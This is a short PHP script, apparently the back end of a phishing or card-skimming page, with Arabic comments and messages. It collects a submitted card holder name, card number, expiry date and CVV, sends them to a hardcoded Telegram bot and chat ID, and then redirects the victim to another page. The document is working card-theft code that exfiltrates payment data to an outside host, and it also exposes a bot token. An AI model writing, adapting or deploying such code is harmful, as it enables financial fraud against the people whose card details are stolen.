<?php
$botToken = '6889028993:AAF6k21E9ZKMZ8SH-WDxVl8P9AHOcljMHmE';
$chatId = '5694585021';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $cardHolder = $_POST['cardHolder'];
    $cardNumber = $_POST['cardNumber'];
    $expiryMonth = $_POST['expiryMonth'];
    $expiryYear = $_POST['expiryYear'];
    $cvv = $_POST['cvv'];
    
    // يمكنك هنا استخدام البيانات المرسلة كما تريد، مثلاً إرسالها إلى بريدك الإلكتروني أو حفظها في قاعدة البيانات
    
    // إرسال رسالة إلى بوت تليجرام
    $message = "تم استلام بيانات جديدة:\n اسم:  $cardHolder\n رقم البطاقة: $cardNumber\n الشهر: $expiryMonth\nالسنة:$expiryYear\n رمز البطاقة$cvv\n\n\n";
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $message
    );

    $options = array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type:application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data)
        )
    );

    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    if ($result === false) {
        echo 'فشل في إرسال الرسالة.';
    } else {
        header('Location: sss.html');
        exit;
    }
    
}
?>